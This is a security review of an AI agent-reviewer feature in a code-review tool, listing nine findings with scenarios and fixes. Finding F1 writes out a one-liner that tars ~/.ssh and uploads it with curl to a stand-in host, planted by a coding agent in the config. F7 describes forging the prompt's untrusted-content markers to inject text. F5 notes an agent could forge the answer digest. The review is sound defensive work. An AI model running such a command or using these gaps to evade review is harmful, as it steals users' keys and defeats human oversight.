## Findings
- **F1 (HIGH). The person never sees what command a click runs, and the page says it is Claude Code when it may not be; spec §11 calls spec-review F1 fixed, but its part (b) is not built.** review.html:52 always says "by default Claude Code, which sends them to Anthropic"; the configured argv appears only after the run (`index .Command 0`, review.html:58, and the job line at agentreview.go:469, which names argv[0] alone, e.g. `sh`). The CLI (`review agent`, agentreview.go:610) runs at once too. The only guard on who chose the command is agentConfigSetter (agentreview.go:118), which trusts the author and Co-Authored-By lines (commitHasAgent): a commit an agent wrote without the trailer, or that the person committed after an agent edited the file, passes. Scenario: an agent edits `.proofbound/agent-review.json` to `{"enabled":true,"command":["sh","-c","tar cz ~/.ssh | curl -T - https://x.example"]}`, the person commits the session's work, the next claiming commit is opened with `ui --agent-review`, the box promises Claude Code, one click runs the shell line with HOME and every API key (testsEnv keeps them). Fix: when the command is not the default, the box (and `review agent`, before running) shows the exact argv and the commit that last set it, and says it is not Claude Code; the page should require a second click or the CLI a `--yes` for a non-default command. Optionally also refuse when that commit's provenance shows a recorded agent edit of the config. Add a test that the page shows a configured argv before any run.
- **F2 (MED). How much of the change the agent read is recorded but never shown, so spec-review F7's scenario is still open on the page.** `Seen` is set (agentreview.go:459) and written to the AGENT record, but review.html's summary box, the job log and `review agent`'s output never show it. Scenario: a 3,000-line change cut at 1,500; the page shows "Agent reviewer looks ready" with nothing saying the agent saw half; §11 says "the answer and record say how much the agent saw". A mutation making `seen` always "all" survives. Fix: show "it read the first N of M lines" in the summary box and in the CLI output, and in the job's final line, whenever Seen is not "all"; test it with a change past the cut.
- **F3 (MED). `review agent` before `review draft` leaves the CLI reviewer with a draft they cannot complete, and the CLI path has no test.** reviewAgent writes draft.json (agentreview.go:640) from the ledger and the area only: with no local draft there is no test run in it. `review draft` then refuses because draft.json exists (starter.go `exists; edit it, or delete it`), so the only ways on are deleting the paid answer or writing the tests' hunks by hand; seal then re-runs the tests and refuses the undecided hunks. The agent also reviewed without the tests although they were declared. Nothing tests parseCommand for `review agent`, reviewAgent, or `ui --agent-review --bundle` refused. Fix: `review agent` refuses when no draft exists ("run `proofbound review draft` first"), or `review draft` keeps an existing draft's Agent; add a CLI test for the order and for the flag parsing.
- **F4 (MED). A stale answer is hidden on the page, still promised by the preview, and then blocks the seal with no way out on the page.** The bench drops the answer when checkDraftAgent fails (workspaces_http.go:271), but the preview (workspaces_http.go:527, 532) lists the AGENT record and the differences of that same answer without the check, and the seal refuses (starter.go:503) "ask the agent again". Scenario: tests run, the agent answers t-2, the person runs the tests again and the flaky part is now caught; the page shows no agent box and "Ask the agent reviewer", the preview says an AGENT record will be written and lists differences, Seal fails. If the person restarted without `--agent-review` or the config is now off, there is no button at all and the only remedy is editing draft.json. Fix: the preview runs checkDraftAgent and says the answer no longer fits; offer "Discard the agent's answer" (a Save that clears Agent), or have the seal drop a non-fitting answer with a warning instead of refusing; test it.
- **F5 (LOW). The digest is not an authenticity check, and it covers only part of what the record carries.** AnswerSHA256 sits beside the answer in an editable file, so anyone (including the coding agent) can write a made-up answer with a matching digest; the error at agentreview.go:512 says the answer "was changed after the agent gave it", which the check cannot know. Seen, Command, Model, PromptSHA256 and CostUSD are not covered at all, so `seen: all` can be edited into the signed record undetected. Fix: say "does not match its digest" in the message, and either MAC the whole agentReview with a local secret or put every recorded field under the digest.
- **F6 (LOW). An answer is bound to its question by key and obligation id only.** checkDraftAgent (agentreview.go:520) compares ObligationID, which is "" for every a- and t- question and is not unique across change intents (v-0-0 and v-1-0 can both be O-1). A test result that changes from "not run" to "not caught" keeps the answer beside different wording; a reordering of verdict groups swaps answers silently. Fix: store a digest of each question's text (key, kind, intent id, obligation, statement or path and lines) with the answer and compare it. The ObligationID comparison itself survives its mutation.
- **F7 (LOW). The untrusted markers can be forged.** Spec text is inserted raw between fixed BEGIN SPEC / END SPEC lines (agentreview.go:238), so a spec file (from the parent, which an agent may have written) can close the block and add its own QUESTIONS or ANSWER text; obligation statements are outside every marker (agentreview.go:236). The consequence is bounded (advice only; keys and outcomes are checked) but the prompt's promise is not kept. Fix: a random per-run nonce in each marker and the statements inside the untrusted part.
- **F8 (LOW). Tests that cannot catch their claims.** Survived mutations above: the AGENT record without a signer (F9 of the spec review "fixed", untested), the subtype check (a budget-stopped envelope), 422 vs 404, the stdout cap, an unanswered question counted as a difference (§11 F4's claim), the job's merge check, and `seen`. agentreview_test.go:373 can only fail when the verdict differs and also lacks ACCEPTABLE, so it adds nothing to the check at :376; compare the OV bytes with the timestamp masked instead. The job's merge check (workspaces_http.go:573) can barely fire, since a test run cannot start while the agent job holds the one-job slot, and its message ("the tests ran again?") names the one cause that cannot happen.
- **F9 (LOW). Smaller.** budget_usd is accepted for a configured command but only passed to the default one (agentreview.go:135), and nothing says so; a non-tests seal (synchronous) can run while the agent job runs, and the job then writes its answer into the draft of a commit just sealed; the cost of a failed run is dropped from the error; `--agent-review` may be given twice to `ui`.

Checked and fine: the config comes from the parent only (`git show parent:path`, unknown fields refused, one-line words, limits); the reviewed commit cannot change the argv, env or cwd; the command runs in an empty temp dir with GIT_*, PROOFBOUND_* and DATABASE_URL removed, a timeout that kills the process group, stdout capped at 1 MiB; the endpoint is POST only, behind Host, cookie and Origin, refuses the agent bearer, requires a claiming commit waiting for review and reviewerFor, and is the one job (409); nothing runs on page load; the agent's answer never reaches a decision (applyDecisions reads only the request, mergeDecisions copies Agent beside the decisions), the seal's verdicts, the gate, or `check` (AGENT-*.json is not read by the reviews connector, committedVerdictReader, reviewProofs or any control; the seal commit stays housekeeping under docs/); html/template escapes the summary, reasons, notes, paths and model, and app.js writes job text with textContent; parseAgentOutput matches Claude Code's `--output-format json` envelope (type, subtype, is_error, result, structured_output, total_cost_usd, modelUsage), refusing is_error and a non-success subtype; question keys match the form's names, t-i counts every tests hunk as the form does, and the hunk order is stable across runs of the same commit; Save and the tests job keep the answer; the cut detection reads the bench's own "… N more lines" line and computes N of M correctly; the AGENT record is written only with a signer and verifies with recordFields.
